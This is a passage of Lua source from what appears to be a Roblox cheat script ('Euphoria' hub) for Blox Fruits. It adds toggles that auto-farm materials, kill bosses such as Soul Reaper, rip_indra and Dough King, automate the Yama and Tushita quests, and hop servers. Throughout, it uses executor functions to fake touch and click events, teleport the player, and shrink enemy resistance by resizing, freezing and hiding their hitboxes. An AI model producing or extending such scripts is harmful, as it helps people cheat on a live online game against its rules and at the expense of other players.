                                            until getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior")
                                        end
                                        if ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                            break
                                        end
                                        wait(2)
                                    end
                                end
                            end
                        end)
                    end
                end
            end) 
            FarmDemonicWisp = Sea3MaterialsSection:NewToggle("Farm Demonic Wisp", function(state)
                getgenv().EuphoriaSettings["Farm Demonic Wisp"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Demonic Wisp"] then FarmDemonicWisp:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Demonic Wisp"] then _G.FarmDemonicWisp = true else _G.FarmDemonicWisp = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmDemonicWisp and third_sea then
                        pcall(function()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") then
                                target = getClosest({"Demonic Soul"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDemonicWisp or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            elseif ReplicatedStorage:FindFirstChild("Demonic Soul") then
                                target = getClosest({"Demonic Soul"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDemonicWisp or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                    if string.find(v.Name, "Demonic Soul") then
                                        if getDistance(v.CFrame) > 500 then
                                            repeat wait()
                                                useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                toPoint(v.CFrame * CFrame.new(0,50,0))
                                            until getDistance(v.CFrame) < 400 or ReplicatedStorage:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") 
                                        end
                                        if ReplicatedStorage:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") then
                                            break
                                        end
                                        wait(2)
                                    end
                                end
                            end
                        end)
                    end
                end
            end) 
            AutoKillSoulReaper = Sea3ItemsSection:NewToggle("Auto Kill Soul Reaper", function(state)
                getgenv().EuphoriaSettings["Auto Kill Soul Reaper"] = state
                WriteSettings()
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Kill Soul Reaper"] and (workspace.Enemies:FindFirstChild("Soul Reaper") or ReplicatedStorage:FindFirstChild("Soul Reaper")) then _G.AutoSoulReaper = true else _G.AutoSoulReaper = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoSoulReaper and third_sea then
                            if workspace.Enemies:FindFirstChild("Soul Reaper") or ReplicatedStorage:FindFirstChild("Soul Reaper") then
                                v = workspace.Enemies:FindFirstChild("Soul Reaper") or ReplicatedStorage:FindFirstChild("Soul Reaper")
                                if v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        EquipWeapon(_G.SelectWeapon)
                                        if useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                            StopTween()
                                        end
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        v.Humanoid.WalkSpeed = 0
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.Humanoid:ChangeState(14)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        MonName = v.Name
                                        PosMon = v.HumanoidRootPart.CFrame
                                    until not _G.AutoSoulReaper or not v or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    end)
                end
            end)
            AutoSpawnSoulReaper = Sea3ItemsSection:NewToggle("Auto Spawn Soul Reaper", function(state)
                getgenv().EuphoriaSettings["Auto Spawn Soul Reaper"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Spawn Soul Reaper"] then AutoSpawnSoulReaper:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Spawn Soul Reaper"] and  isItemInEquip("Hallow Essence") then
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 0)
                            wait()
                            firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 1)
                        end
                    end)
                end
            end)
            Sea3ItemsSection:NewButton("Spawn Soul Reaper (hallow essence)", function()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 0)
                wait()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map["Haunted Castle"].Summoner.Detection, 1)
            end)
            Sea3ItemsSection:NewLabel(" ")
            AutoCanvander = Sea3ItemsSection:NewToggle("Auto Canvander", function(state)
                getgenv().EuphoriaSettings["Auto Canvander"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Canvander"] then AutoCanvander:UpdateToggle(nil, true) end
            AutoCanvanderHop = Sea3ItemsSection:NewToggle("Auto Canvander Hop", function(state)
                getgenv().EuphoriaSettings["Auto Canvander Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Canvander Hop"] then AutoCanvanderHop:UpdateToggle(nil, true) end
            Sea3ItemsSection:NewLabel(" ")
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Canvander"] and not isWeaponInInventory("Canvander") then _G.AutoCanvander = true else _G.AutoCanvander = false end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.AutoCanvander and third_sea then
                            if game.Workspace.Enemies:FindFirstChild("Beautiful Pirate") and game.Workspace.Enemies:FindFirstChild("Beautiful Pirate"):FindFirstChild("HumanoidRootPart") and game.Workspace.Enemies:FindFirstChild("Beautiful Pirate").Humanoid.Health > 0 then
                                v = game.Workspace.Enemies:FindFirstChild("Beautiful Pirate")
                                if v:FindFirstChild("HumanoidRootPart") then
                                    if v.Humanoid.Health <= 0 then 
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    else
                                        repeat task.wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            v.Humanoid:ChangeState(14)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Head.CanCollide = false
                                            BringMobFarm = false
                                            RenMon = v.Name
                                            RenPos = v.HumanoidRootPart.CFrame
                                        until not _G.AutoCanvander or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                else
                                    toTarget(LP.Character.HumanoidRootPart.CFrame)
                                end
                            elseif game.ReplicatedStorage:FindFirstChild("Beautiful Pirate") and game.ReplicatedStorage:FindFirstChild("Beautiful Pirate"):FindFirstChild("HumanoidRootPart") and game.ReplicatedStorage:FindFirstChild("Beautiful Pirate").Humanoid.Health > 0 then
                                v = game.ReplicatedStorage:FindFirstChild("Beautiful Pirate")
                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                wait(4)
                            else
                                if getgenv().EuphoriaSettings["Auto Canvander Hop"] then
                                    HopServer()
                                end
                            end
                        end
                    end)
                end
            end)


            


            Sea3ItemsSection:NewLabel(" ")
            Sea3ItemsSection:NewButton("Turn On All Haki Plates [rip_indra]", function()
                pos = LP.Character.HumanoidRootPart.CFrame
                wait()
                for i,v in pairs(game.Workspace.Map["Boat Castle"].Summoner.Circle:GetChildren()) do 
                    if v.Name == "Part" then 
                        if v.Part.BrickColor ~= BrickColor.new("Lime green") then 
                            if v.BrickColor == BrickColor.new("Oyster") then 
                                for ci,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Snow White' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Snow White")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            if not delta then
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 0) 
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 1) 
                                            end
                                            wait()
                                        end
                                    end
                                end
                            end
                            if v.BrickColor == BrickColor.new("Hot pink") then 
                                for cv,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Winter Sky' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Winter Sky")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            if not delta then
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 0) 
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 1) 
                                            end
                                            wait()
                                        end
                                    end
                                end
                            end
                            if v.BrickColor == BrickColor.new("Really red") then 
                                for cv,cv in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("getColors")) do
                                    if cv.HiddenName == 'Pure Red' then 
                                        if cv.Unlocked == true then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("activateColor","Pure Red")
                                            LP.Character.HumanoidRootPart.CFrame = v.CFrame
                                            if not delta then
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 0) 
                                                firetouchinterest(LP.Character.HumanoidRootPart, v, 1) 
                                            end
                                            wait()
                                        end
                                    end
                                end
                            end
                        end
                    end 
                end
                wait()
                LP.Character.HumanoidRootPart.CFrame = pos
            end)

            Sea3ItemsSection:NewButton("Spawn rip_indra [ACTIVATE PLATES BEFORE]", function()
                
                pos = LP.Character.HumanoidRootPart.CFrame
                wait()
                counter = 0
                for i,v in pairs(game.Workspace.Map["Boat Castle"].Summoner.Circle:GetChildren()) do 
                    if v.Name == "Part" then 
                        if v.Part.BrickColor == BrickColor.new("Lime green") then 
                            counter = counter + 1
                        end
                    end 
                end
                if counter == 3 then
                    firetouchinterest(LP.Character.HumanoidRootPart, game.Workspace.Map["Boat Castle"].Summoner.Detection, 0) 
                    wait()
                    firetouchinterest(LP.Character.HumanoidRootPart, game.Workspace.Map["Boat Castle"].Summoner.Detection, 1) 
                end

                wait()
                LP.Character.HumanoidRootPart.CFrame = pos
            end)
            killIndra = Sea3ItemsSection:NewToggle("Kill Indra", function(value)
                getgenv().EuphoriaSettings["Kill Indra"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Kill Indra"] then killIndra:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Kill Indra"] then
                            _G.KillIndra = true
                        else
                            _G.KillIndra = false
                        end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if _G.KillIndra then
                            if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form") then
                                v = game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form")
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not _G.KillIndra or v.Humanoid.Health <= 0 or not v.Parent
                                end
                            elseif ReplicatedStorage:FindFirstChild("rip_indra True Form") then
                                v = ReplicatedStorage:FindFirstChild("rip_indra True Form")
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = false
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not _G.KillIndra or v.Humanoid.Health <= 0 or not v.Parent
                                end
                            end
                        end
                    end)
                end
            end)

            

            function getTushitaProgress()
                progress = ReplicatedStorage.Remotes.CommF_:InvokeServer("TushitaProgress")
                if progress.KilledLongma then 
                    return 100
                end
                if progress.OpenedDoor then
                    return 50
                else
                    return 0
                end
            end
            Sea3ItemsSection:NewLabel(" ")
            yamaProgress = Sea3ItemsSection:NewLabel("")
            spawn(function()
                while wait(2) do
                    pcall(function()
                        count = ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter","Progress") + ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter","Progress")
                        yamaProgress:UpdateLabel("⚔️ Yama Progress: " .. tostring(count))
                        wait(30)
                    end)
                end
            end)

            AutoYamaToggle = Sea3ItemsSection:NewToggle("Auto Yama", function(state)
                getgenv().EuphoriaSettings["Auto Yama"] = state
                WriteSettings()
                AutoYama = state
            end)
            AutoYamaHopToggle = Sea3ItemsSection:NewToggle("Auto Yama Hop [Must have]", function(state)
                getgenv().EuphoriaSettings["Auto Yama Hop"] = state
                WriteSettings()
                AutoYamaHop = state
            end)
            if getgenv().EuphoriaSettings["Auto Yama"] or AutoYama then AutoYamaToggle:UpdateToggle(nil, true) end
            if getgenv().EuphoriaSettings["Auto Yama Hop"] or AutoYamaHop then AutoYamaHopToggle:UpdateToggle(nil, true) end

            AutoTushita = false
            AutoTushitaToggle = Sea3ItemsSection:NewToggle("Auto Tushita", function(state)
                getgenv().EuphoriaSettings["Auto Tushita"] = state
                WriteSettings()
                
            end)
            if getgenv().EuphoriaSettings["Auto Tushita"] then AutoTushitaToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Tushita"] and not isWeaponInInventory("Tushita") then
                            AutoTushita = true
                        else
                            AutoTushita = false
                        end
                    end)
                end
            end)
            AutoCDKToggle = Sea3ItemsSection:NewToggle("Auto Cursed Dual Katana", function(value)
                getgenv().EuphoriaSettings["AutoCDK"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["AutoCDK"] then AutoCDKToggle:UpdateToggle(nil, true) end

            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoTushita and third_sea then
                            if not isWeaponInInventory("Tushita") then
                                progress = getTushitaProgress()
                                if progress ~= 100 then
                                    if progress == 50 then
                                        if not game:GetService("Workspace").Enemies:FindFirstChild("Longma") then
                                            useNearestEntrance(CFrame.new(-10148.1641, 423.734192, -9543.64648, -0.93039453, -7.7153004e-09, -0.366559714, 1.02859437e-08, 1, -4.71554458e-08, 0.366559714, -4.76435815e-08, -0.93039453) * OffsetCFrame())
                                            toPoint(CFrame.new(-10148.1641, 423.734192, -9543.64648, -0.93039453, -7.7153004e-09, -0.366559714, 1.02859437e-08, 1, -4.71554458e-08, 0.366559714, -4.76435815e-08, -0.93039453))
                                        else
                                            v = game:GetService("Workspace").Enemies:FindFirstChild("Longma")
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = false
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                until not AutoTushita or v.Humanoid.Health <= 0 or not v.Parent
                                            end
                                        end
                                    elseif progress == 0 then
                                        if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form") or ReplicatedStorage:FindFirstChild("rip_indra True Form") then
                                            if not isItemInEquip("Holy Torch") then
                                                if useNearestEntrance(game.Workspace.Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame) then 
                                                    StopTween()
                                                end
                                                toPoint(game.Workspace.Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame)
                                            end
                                        end
                                        if isItemInEquip("Holy Torch") then
                                            StopTween()
                                            wait(3)
                                            repeat wait()
                                                repeat wait()
                                                    if useNearestEntrance(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame) then
                                                        StopTween()
                                                    end
                                                    toPoint(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame)
                                                until getDistance(game.Workspace.Map.Turtle.QuestTorches.Torch1.CFrame) < 50
                                                -- if delta then
                                                --     for i,torch in pairs(game.Workspace.Map.Turtle.QuestTorches:GetChildren()) do
                                                --         if getDistance(torch.CFrame) > 10 and not torch.Particles.Main.Enabled then
                                                --             repeat wait()
                                                --                 toTarget(torch.CFrame)
                                                --             until getDistance(torch.CFrame) < 10 or not AutoTushita or getTushitaProgress() > 0
                                                --             wait(1)
                                                --         end
                                                --     end
                                                -- else
                                                    for i,torch in pairs(game.Workspace.Map.Turtle.QuestTorches:GetChildren()) do
                                                        if torch:FindFirstChild("TouchInterest") then
                                                            firetouchinterest(LP.Character.HumanoidRootPart, torch, 0)
                                                            wait()
                                                            firetouchinterest(LP.Character.HumanoidRootPart, torch, 1)
                                                        end
                                                    end
                                                -- end
                                            until getTushitaProgress() > 0 or not AutoTushita
                                        end
                                    end
                                end
                            end 
                        end
                    end) 
                end
            end)
            
            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoYama and third_sea and not isWeaponInInventory("Yama") then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter","Progress") + ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter","Progress") < 30 then
                                if LP.PlayerGui.Main.Quest.Visible == true then
                                    if string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Diablo") then
                                        EliteName = "Diablo"
                                    elseif string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Deandre") then
                                        EliteName = "Deandre"
                                    elseif string.find(LP.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Urban") then
                                        EliteName = "Urban"
                                    end
                                    if not game:GetService("Workspace").Enemies:FindFirstChild(EliteName) then
                                        if game.ReplicatedStorage:FindFirstChild(EliteName) then
                                            v = game.ReplicatedStorage:FindFirstChild(EliteName)
                                            useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        else
                                            if EliteName == "Urban" then
                                                toTarget(CFrame.new(-12327.908203125, 361.136962890625, -9618.01171875))
                                            elseif EliteName == "Deandre" then
                                                toTarget(CFrame.new(-13982.4052734375, 330.6456298828125, -9260.4814453125))
                                            elseif EliteName == "Diablo" then
                                                toTarget(CFrame.new(-11153.138671875, 736.5569458007812, -6851.171875))
                                            end
                                        end
                                    else
                                        v = game:GetService("Workspace").Enemies:FindFirstChild(EliteName)
                                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                            repeat wait()
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Head.CanCollide = false
                                                PosMon = v.HumanoidRootPart.CFrame
                                                BringMobFarm = false
                                                EquipWeapon(_G.SelectWeapon)
                                                v.HumanoidRootPart.Transparency = 1
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            until not AutoYama or v.Humanoid.Health <= 0 or not v.Parent
                                        end
                                    end
                                else
                                    if AutoYamaHop and ReplicatedStorage.Remotes["CommF_"]:InvokeServer("EliteHunter") == "I don't have anything for you right now. Come back later." then
                                        HopServer()
                                    else
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter")
                                    end
                                end
                            else
                                repeat wait(.1)
                                    fireclickdetector(game:GetService("Workspace").Map.Waterfall.SealedKatana.Handle.ClickDetector)
                                until not isWeaponInInventory("Yama") or not AutoYama
                            end
                        end
                    end)
                end
            end)
            function isDoughSpawned()
                if ReplicatedStorage:FindFirstChild("Dough King") or ReplicatedStorage:FindFirstChild("Cake Prince") or game.Workspace.Enemies:FindFirstChild("Dough King") or game.Workspace.Enemies:FindFirstChild("Cake Prince") then
                    return true
                else return false end
            end
            Sea3ItemsSection:NewLabel("")
            leftToSpawnDough = Sea3ItemsSection:NewLabel("Mobs Left to Spawn: Enable Auto Spawn Dough/Cake Boss")
            farmDough = Sea3ItemsSection:NewToggle("Farm Mobs for Spawn", function(value)
                getgenv().EuphoriaSettings["Farm Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Dough"] then farmDough:UpdateToggle(nil, true) end
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Dough"] and not isDoughSpawned() then
                            _G.FarmDough = true
                        else
                            _G.FarmDough = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        local npcList = {"Head Baker","Baking Staff","Cookie Crafter","Cake Guard"}
                        if _G.FarmDough and not isDoughSpawned() then
                            qqw = getClosest(npcList)
                            if qqw then
                                if qqw.Humanoid.Health > 0 then
                                    repeat wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        qqw.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        qqw.HumanoidRootPart.CanCollide = false
                                        qqw.Humanoid.WalkSpeed = 0
                                        qqw.Head.CanCollide = false
                                        BringMobFarm = true
                                        PosMon = qqw.HumanoidRootPart.CFrame
                                        EquipWeapon(_G.SelectWeapon)
                                        qqw.HumanoidRootPart.Transparency = 1
                                        if useNearestEntrance(qqw.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                            StopTween()
                                        end
                                        toTarget(qqw.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not qqw or qqw.Humanoid.Health <= 0 or not _G.FarmDough or isDoughSpawned() or LP.Character.Humanoid.Health <= 0
                                    PosMon = nil
                                end
                            else
                                for i,v in pairs(getSpawnPoints(npcList)) do
                                    print("to spawn point")
                                    if getClosest(npcList) then break end
                                    if getDistance(v * OffsetCFrame()) > 100 then
                                        repeat wait()
                                            if useNearestEntrance(v * OffsetCFrame()) then
                                                StopTween()
                                            end
                                            toTarget(v * OffsetCFrame())
                                        until getDistance(v * OffsetCFrame()) < 50 or getClosest(npcList) or not _G.FarmDough
                                    end
                                end 
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)

            autoSpawnDough = Sea3ItemsSection:NewToggle("Auto Spawn Dough/Cake Boss", function(value)
                getgenv().EuphoriaSettings["Auto Spawn Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Spawn Dough"] then autoSpawnDough:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    local s,e = pcall(function()
                        local MobsLeft
                        if getgenv().EuphoriaSettings["Auto Spawn Dough"] then
                            if not isDoughSpawned() then
                                local mbs = ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", false)
                                if mbs then
                                    if string.len(mbs) == 88 then
                                        MobsLeft = tonumber(string.sub(mbs,39,41))
                                    elseif string.len(mbs) == 87 then
                                        MobsLeft = tonumber(string.sub(mbs,39,40))
                                    elseif string.len(mbs) == 86 then
                                        MobsLeft = tonumber(string.sub(mbs,39,39))
                                    end
                                else
                                    MobsLeft = 0
                                end
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: "..tostring(MobsLeft).." (Spawn Enabled)")
                            else
                                MobsLeft = 0
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: 0 (Spawn Enabled)")
                            end
                            if MobsLeft < 15 and _G.AutoBuySweetChalice then
                                local args = {
                                    [1] = "SweetChaliceNpc"
                                }
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                            end
                        else
                            if not isDoughSpawned() then
                                local mbs = ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true)
                                if mbs then
                                    if string.len(mbs) == 88 then
                                        MobsLeft = tonumber(string.sub(mbs,39,41))
                                    elseif string.len(mbs) == 87 then
                                        MobsLeft = tonumber(string.sub(mbs,39,40))
                                    elseif string.len(mbs) == 86 then
                                        MobsLeft = tonumber(string.sub(mbs,39,39))
                                    end
                                else
                                    MobsLeft = 0
                                end
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: "..tostring(MobsLeft))
                            else
                                leftToSpawnDough:UpdateLabel("Mobs Left to Spawn: 0")
                            end
                        end
                    end)
                    if e then print(e) end
                end
            end)

            killDough = Sea3ItemsSection:NewToggle("Kill Dough King / Cake Prince", function(value)
                getgenv().EuphoriaSettings["Kill Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Kill Dough"] then killDough:UpdateToggle(nil, true) end
            killOnlyDough = Sea3ItemsSection:NewToggle("Kill ONLY Dough King", function(value)
                getgenv().EuphoriaSettings["kill Only Dough"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["kill Only Dough"] then killOnlyDough:UpdateToggle(nil, true) end

            spawn(function()
                while task.wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Kill Dough"] then
                            if getgenv().EuphoriaSettings["kill Only Dough"] then
                                if ReplicatedStorage:FindFirstChild("Dough King") and ReplicatedStorage:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif game.Workspace.Enemies:FindFirstChild("Dough King") and game.Workspace.Enemies:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                end
                            else
                                if ReplicatedStorage:FindFirstChild("Dough King") and ReplicatedStorage:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif game.Workspace.Enemies:FindFirstChild("Dough King") and game.Workspace.Enemies:FindFirstChild("Dough King").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif ReplicatedStorage:FindFirstChild("Cake Prince") and ReplicatedStorage:FindFirstChild("Cake Prince").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                elseif game.Workspace.Enemies:FindFirstChild("Cake Prince") and game.Workspace.Enemies:FindFirstChild("Cake Prince").Humanoid.Health > 0 then
                                    _G.KillDough = true
                                else
                                    _G.KillDough = false
                                end
                            end
                        else _G.KillDough = false
                        end
                    end)
                end
            end)
            autoBuyChalice = Sea3ItemsSection:NewToggle("Auto Buy Sweet Chalice", function(value)
                getgenv().EuphoriaSettings["Auto Buy Sweet Chalice"] = value
                _G.AutoBuySweetChalice = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Buy Sweet Chalice"] then autoBuyChalice:UpdateToggle(nil, true) end
            Sea3ItemsSection:NewButton("Buy Sweet Chalice", function()
                local args = {
                    [1] = "SweetChaliceNpc"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end)
            
            function tpToDoughIfNeed()
